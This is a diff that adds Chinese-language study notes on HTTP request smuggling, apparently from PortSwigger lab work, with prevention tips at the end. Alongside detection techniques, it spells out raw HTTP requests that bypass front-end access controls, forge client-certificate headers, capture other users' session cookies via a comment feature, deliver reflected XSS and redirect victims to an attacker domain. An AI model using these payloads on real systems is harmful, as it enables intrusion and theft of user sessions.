@@ -3789,6 +3789,10 @@ SMUGGLED
 
 
 
+注：实验中要连续发送两次，才会将留在缓冲区的内容作为下次请求的头进行处理。
+
+
+
 #### TE.CL
 
 ```http
@@ -3800,25 +3804,195 @@ Transfer-Encoding: chunked
 8
 SMUGGLED
 0
+
+
 ```
 
+前端使用 `Transfer-Encoding: chunked` ，按8个字节将 SMUGGLED 转发给后端，后端使用 `Content-Length: 3` 处理，将前3个字节视为一个请求，将 SMUGGLED 作为下个请求的内容处理。
 
 
 
+注：结尾 0 之后要包含 `\r\n\r\n` 
 
 
 
 #### TE.TE
 
+前后端都支持 TE 头，但其中一个服务器会被某种混淆头诱导从而不处理该头，一些常见的混淆头
+
+```http
+Transfer-Encoding: xchunked
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+Transfer-Encoding:[tab]chunked
+
+[space]Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+
+```
+
+这些混淆技术都对标准 HTTP 规范做了微妙偏离，而实现协议规范的真实代码做不到绝对精确遵守 HTTP 规范，对不同变体的容忍就很常见，因此发现 TE.TE 漏洞就需要找到类似上面的变体，使得前后端只有一个服务器处理它，另一个服务器忽略它。  
+
+根据被诱导不处理 TE 头的顺序，攻击形式与前面 CL.TE 或者 TE.CL 相同。
 
 
 
 
 
+### 识别漏洞
+
+大多数探测识别 HTTP 请求走私漏洞的技术是发送导致延迟响应。
 
 
 
-### 识别
+#### CL.TE
+
+对于 CL.TE 类型的漏洞，可以通过发送类似如下请求：
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+A
+X
+```
+
+前端使用 CL 头，转发X之前的内容，将 X 忽略，而后端使用 TE 头，处理第一个 chunk 然后等待下一个 chunk，这里就可以观察到有延迟。  
+
+
+
+#### TE.CL
+
+对于 TE.CL 类型的漏洞，可以通过发送类似如下请求：
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+X
+```
+
+前端使用 TE 头，转发一部分，忽略 X。后端服务器使用 CL 头，认为有 6 字节数据，会等待更多内容到达，就能观察到延迟。  
+
+
+
+注：如果应用有 CL.TE 漏洞，使用 TE.CL 的测试方法可能会干扰到正常用户的请求。为了减少干扰或者保持隐蔽，可以先使用 CL.TE 测试，当测试不成功时再继续 TE.CL 测试。  
+
+
+
+### 根据 response 差异确认漏洞存在
+
+当检测到可能存在请求走私漏洞时，可以尝试触发应用 response 响应内容的差异，进一步确认漏洞。  
+
+向应用快速连续发送两个请求：
+
+* 一个攻击请求，用来干扰下一个请求
+* 一个正常请求
+
+如果正常请求的响应中包含了预期的干扰，就可以确认漏洞存在。  
+
+示例请求，一个正常请求如下，通过参数传递要检索的字符串：
+
+```http
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+```
+
+#### **CL.TE**  
+
+发送类似如下请求来确认 CL.TE 类型的漏洞：
+
+```http
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+Transfer-Encoding: chunked
+
+e
+q=smuggling&x=
+0
+
+GET /404 HTTP/1.1
+Foo: x
+```
+
+如果存在漏洞，服务端将会收到看起来类似如下请求：
+
+```http
+GET /404 HTTP/1.1
+Foo: xPOST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+```
+
+由于包含无效 URL，服务端返回 404 状态码，表明攻击请求干扰到了正常请求。  
+
+
+
+#### **TE.CL**  
+
+发送类似如下请求来确认 TE.CL 类型漏洞：
+
+```http
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+7c
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 144
+
+x=
+0
+```
+
+如果存在漏洞，服务器会收到类似如下请求：
+
+```http
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 144
+
+x=
+0
+
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+```
+
+同上一节一样，由于包含无效 URL，服务器返回 404，表明攻击干扰到了正常请求。
 
 
 
@@ -3827,6 +4001,383 @@ SMUGGLED
 
 
 ### 利用
+
+http 请求走私可以被利用的地方取决于漏洞所在的功能模块。
+
+
+
+#### 绕过前端安全控制策略
+
+一些应用在web前端服务器实施某些安全控制，决定是否允许处理单个请求，通过这些安全控制策略后再被转发到后端服务器。  
+
+假设后端服务器不进一步检查前端发过来的请求，认为已经通过鉴权，这种情况下 http 请求走私就会被利用绕过访问控制，实现对受限 URL 的访问。  
+
+例如用户被允许访问 /home 但不允许访问 /admin。可以使用如下请求走私绕过限制：
+
+```http
+POST /home HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: xGET /home HTTP/1.1
+Host: vulnerable-website.com
+```
+
+前端服务器根据 `Content-Length: 62` 认为收到两个访问 /home 的请求，就转发到后端服务器，后端服务器根据 `Transfer-Encoding` 判断为一个访问 /home 和一个 /admin 的请求，并认为前端服务器已经完成鉴权就允许请求访问。  
+
+
+
+
+
+#### 揭示前端请求重写
+
+很多应用在前端服务器中会修改重写请求，然后再转发给后端服务器，通常是添加一些请求 header，例如：
+
+* 终止 TLS 连接，添加描述所用协议、密码套件相关头部
+* 添加包含用户 IP 的 `X-Forwarded-For` 头
+* 根据用户的会话令牌确定用户 ID，并添加一个标识该用户的 header
+* 其它敏感信息
+
+很多情况下，如果请求走私中缺少前端添加的请求头，后端服务器不会正常处理此请求，就导致走私请求无法产生预期效果。  
+
+有一种简单的方法可以精确揭示前端服务器是如何重写请求：
+
+* 找到一个请求参数的值反射到应用程序响应中的 POST 请求
+* 打乱参数顺序，使被反射的参数出现在消息体的最后
+* 将这个请求走私到后端服务器，紧接着是一个你希望揭示其重写形式的正常请求
+
+
+
+假设一个登录功能，反射了邮箱 email 参数值：
+
+```http
+POST /login HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 28
+
+email=wiener@normal-user.net
+```
+
+响应中包含如下值：
+
+```html
+<input id="email" value="wiener@normal-user.net" type="text">
+```
+
+就可以使用如下形式的请求走私来查看前端服务器的重写逻辑：
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 130
+Transfer-Encoding: chunked
+
+0
+
+POST /login HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+email=POST /login HTTP/1.1
+Host: vulnerable-website.com
+...
+```
+
+上面的请求被前端服务器重写，包含了额外的 header，然后后端服务器处理走私的请求，并将重写后第二个请求视为 email 的值，将第二个请求的响应反射到这个值：
+
+```html
+<input id="email" value="POST /login HTTP/1.1
+Host: vulnerable-website.com
+X-Forwarded-For: 1.3.3.7
+X-Forwarded-Proto: https
+X-TLS-Bits: 128
+X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
+X-TLS-Version: TLSv1.2
+x-nr-external-service: external
+...
+```
+
+由于最终请求被重写，我们不知道它有多长。请求走私中的 `Content-Length` 头的值将决定后端服务器认为请求数据有多长，如果太短只能收到部分重写请求，如果设的太长后端服务器可能会一直等待直到超时。一般是猜测一个比提交请求稍大的值，然后逐渐调整增加该值检索更多信息。  
+
+
+
+
+
+#### 绕过客户端认证
+
+作为 TLS 握手的一部分，服务器提供证书向客户端证明自己。证书包含了 CN（Common Name），客户端验证这里的 CN 和正在访问的域名匹配。  
+
+有些网站进一步实现了双向 TLS 认证，客户端也需要向服务器出示证书，这种情况下通常客户端的 CN 是用户名之类的，可以在后端应用程序中用作访问控制的一部分。  
+
+认证客户端的组件通常通过一个或多个非标准 HTTP header 将证书中的信息传递给后端服务器或应用。例如，前端服务器将包含客户端 CN 的头附加到任何传入的请求中：
+
+```http
+GET /admin HTTP/1.1
+Host: normal-website.com
+X-SSL-CLIENT-CN: carlos
+```
+
+由于这些 header 完全不经过客户端，由前端服务器添加，后端服务器容易隐式地信任这些请求。  
+
+现实中通常不可利用，因为前端服务器要确认这些内容存在才会添加对应 header。但是如果存在请求走私，前端服务器无法查看到，请求会被原样发送到后端服务器：
+
+```http
+POST /example HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: x-www-form-urlencoded
+Content-Length: 64
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+X-SSL-CLIENT-CN: administrator
+Foo: x
+```
+
+
+
+
+
+
+
+#### 捕获其它用户请求
+
+如果应用中包含任何允许存储并检索文本数据地功能，就存在潜在的可以被利用捕获其它用户的数据。这些内容可能是令牌、用户的敏感数据。适合作为攻击载体的功能：评论、邮件、个人资料、屏幕名称等。  
+
+执行此攻击需要走私一个向存储功能提交数据的请求，其中包含要存储数据的参数被放置在最后。  
+
+示例，假设一个博客评论功能使用如下请求：
+
+```http
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 154
+Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
+```
+
+现在将 `Content-Length` 头设置一个较长的值，并将 commont 参数放在最后：
+
+```http
+GET / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 330
+
+0
+
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
+```
+
+这里发送的数据有 144 字节，但 CL 中设置了 400，此时后端服务器将等待其余数据到达，然后才发出 response，或者超时。当另一个请求过来时，剩余字节的数据就被返回：
+
+```http
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
+...
+```
+
+受害者的数据将被提交到对应的博客评论中，需要捕获更多内容就调整 CL 的值，但需要多轮尝试，超过就会超时。  
+
+portswigger 实验：
+
+```http
+POST / HTTP/1.1
+Host: 0a7400eb03bb8581809dd00600f1005b.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 327
+
+0
+
+POST /post/comment HTTP/1.1
+Host: 0a7400eb03bb8581809dd00600f1005b.web-security-academy.net
+Cookie: session=aBLaAZhjy1cd8kyoAHMsx15vjZ6DmIcf
+Content-Length: 935
+Content-Type: application/x-www-form-urlencoded
+
+csrf=wcIVun0Q5bb19dhlXc3ka5nYjUfA0KNd&postId=1&name=carlos&email=h%40i.j&website=http%3A%2F%2Fk.l&comment=
+```
+
+被捕获的请求就被提交到对应 blog 的评论中：
+
+![image-20261029180717793](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261029180717793.png)
+
+
+
+这种技术的一个限制是通常会在参数分隔符出现的地方停止，例如常见的 URL 分隔符 `&`。
+
+
+
+#### 利用反射型 XSS
+
+如果一个应用有请求走私漏洞，同时还有反射型 XSS漏洞，就可以利用请求走私攻击来使应用中的其他用户触发 XSS，这种方法比常规反射型 XSS 的优势有：
+
+* 它不需要与受害者用户进行任何交互。只需要在走私请求中包含一个 XSS Payload 的请求，下一个用户就会命中触发。
+* 它可以被利用控制常规反射型 XSS中无法轻易控制的 XSS行为，例如修改请求 header。
+
+示例，应用在 UA 中存在反射型 XSS 漏洞，利用方法如下：
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 63
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+User-Agent: <script>alert(1)</script>
+Foo: X
+```
+
+下一个请求的用户将会收到 反射的 XSS Payload，这里是 alert(1)。
+
+
+
+
+
+#### 转换站内重定向为开放重定向
+
+很多应用程序执行从一个 URL 到另一个 URL 的站内重定向，并将 Host 头中的主机名放到重定向 URL 中。Apache、IIS 等 Web 服务器的默认行为：对不带尾部斜杠的文件夹的请求，会收到一个重定向，指向包含尾部斜杠的同一文件夹（Nginx 的配置`server_name_in_redirect` 默认是 `On`，如果被显式设置为 `off` 也会如此）：
+
+```http
+GET /home HTTP/1.1
+Host: normal-website.com
+
+HTTP/1.1 301 Moved Permanently
+Location: https://normal-website.com/home/
+```
+
+这种行为通常是无害的，但在 http 请求走私中可以被利用，将其他用户重定向到外部域名。
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 54
+Transfer-Encoding: chunked
+
+0
+
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: X
+```
+
+走私的请求将触发一个到攻击者网站的重定向，将会影响后端服务器处理的下一个用户的请求，例如：
+
+```http
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: XGET /scripts/include.js HTTP/1.1
+Host: vulnerable-website.com
+
+HTTP/1.1 301 Moved Permanently
+Location: https://attacker-website.com/home/
+```
+
+用户这里请求 /scripts/include.js ，攻击者可以在响应中返回自己的 js 的文件给受害者。  
+
+
+
+
+
+```
+1. 应用根据 Host 头生成重定向 URL
+   ↓
+2. 攻击者走私一个请求，其中 Host 头为 attacker-website.com
+   ↓
+3. 后端处理走私请求，生成重定向 Location: https://attacker-website.com/...
+   ↓
+4. 下一个用户的请求被拼接到走私请求后面
+   ↓
+5. 用户收到 301 重定向到攻击者域名
+   ↓
+6. 用户浏览器请求攻击者域名 → 攻击者返回恶意内容
+```
+
+
+
+
+
+**相对重定向转换为开放重定向**  
+
+有时候会遇到使用路径为 `Location` header 构造相对 URL 的服务器级重定向，例如：
+
+```http
+GET /example HTTP/1.1
+Host: normal-website.com
+
+HTTP/1.1 301 Moved Permanently
+Location: /example/
+```
+
+如果服务器允许在路径中使用协议相对 URL，这仍然可以被用于开放重定向：
+
+```http
+GET //attacker-website.com/example HTTP/1.1
+Host: vulnerable-website.com
+
+HTTP/1.1 301 Moved Permanently
+Location: //attacker-website.com/example/
+```
+
+
+
+
+
+```
+正常根相对重定向：
+GET /example → Location: /example/
+  ↓
+浏览器解释为：https://vulnerable-website.com/example/
+
+协议相对 URL 绕过：
+GET //attacker-website.com/example → Location: //attacker-website.com/example/
+  ↓
+浏览器解释为：https://attacker-website.com/example/
+```
+
+**核心**：`//` 开头的 URL 被浏览器解释为“协议相对”——使用当前页面的协议（如 `https`），但域名是 `//` 后面的部分。服务器如果直接将路径拼接到 `Location` 中，就会生成一个指向外部域名的重定向。  
+
+
+
+
+
+
+
+#### Web 缓存投毒
+
+
+
+
+
+#### Web 缓存欺骗
+
+
 
 
 
@@ -3838,6 +4389,42 @@ SMUGGLED
 
 
 
+#### HTTP/2 请求走私
+
+
+
+
+
+#### Response 队列偷渡
+
+
+
+
+
+
+
+
+
+#### HTTP/2 请求分割
+
+
+
+
+
+
+
+#### HTTP 请求隧道
+
+
+
+
+
+#### 0.CL 请求走私
+
+
+
+
+
 
 
 
@@ -3846,11 +4433,29 @@ SMUGGLED
 
 
 
+#### CL.0 请求走私
+
+
+
+
+
+#### 客户端反同步攻击
+
+
+
+
+
+
+
 
 
 ### 预防
 
-
+* 尽可能使用 HTTP/2 端到端并且关闭 HTTP 降级。
+* 规范前端服务中带歧义的请求，让后端服务器拒绝带有歧义的请求，关闭对应 TCP 连接。
+* 从不假设请求没有 body 的请求，这是 CL.0 和 客户端非同步漏洞的根本原因。
+* 默认丢弃导致服务端处理抛出异常的请求。
+* 如果流量经过转发，尽量在上游开启 HTTP/2。
 
 
 
